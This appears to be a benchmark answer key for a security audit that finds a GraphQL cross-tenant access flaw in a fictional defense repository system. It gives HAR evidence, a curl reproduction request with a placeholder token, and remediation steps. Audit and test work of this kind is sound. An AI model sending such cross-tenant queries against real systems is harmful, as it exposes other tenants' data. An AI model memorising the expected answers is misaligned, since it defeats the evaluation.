# Expected Response

## System
- Domain: Defense Industrial Base
- System: Aegis Vault Secure Repository
- Example ID: GQL-0106

## Priority Findings

### Finding 1: Defense Secret Repository — Operational PII Leakage via getResource (Pattern 7.1)
**Severity:** Critical
**Category:** Logging Failures / Operational PII Leakage

**Summary:**
Per §4.0 RISK-GQL-106 and §5.0 (Pattern 7.1 — operational PII/PHI leakage): The `getResource` resolver fetches by `resourceId` only without enforcing ownership or tenancy boundaries. An attacker from `tenant-c9d2` queried `getResource(id: "R-2106")` and received sensitive defense repository data belonging to `tenant-4a10`, including `sensitiveField: "CONFIDENTIAL-c9d24a10"` and `internalNotes: "Internal data exposed"`. In a Defense Industrial Base context, this constitutes unauthorized access to classified repository metadata with potential national security implications.

**Evidence from HAR:**
- Request: `POST https://api.aegis-vault-secure-r.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-c9d2`
- Query: `query VulnerableOp { getResource(id: "R-2106") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }`
- Response `200 OK`: `tenantId: "tenant-4a10"`, `ownerId: "other-user-c9d24a10"`, `sensitiveField: "CONFIDENTIAL-c9d24a10"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-c9d24a10`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-106 | getResource fetches by resourceId only |
| HAR request | x-tenant-id | Attacker tenant-c9d2 |
| HAR response | tenantId | Cross-tenant resource tenant-4a10 |
| HAR response | sensitiveField | CONFIDENTIAL-c9d24a10 |

## Steps to Reproduce

### Step 1 — Cross-tenant resource access (HAR)
```bash
curl -s -X POST https://api.aegis-vault-secure-r.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-c9d2" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2106\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `tenant-4a10` defense data. **Secure:** FORBIDDEN.

## Remediation
1. Resolver ownership check: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Mask/exclude `internalNotes` from GraphQL schema for cross-tenant queries.
3. Log all cross-tenant access attempts with `x-request-id` for audit trail.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
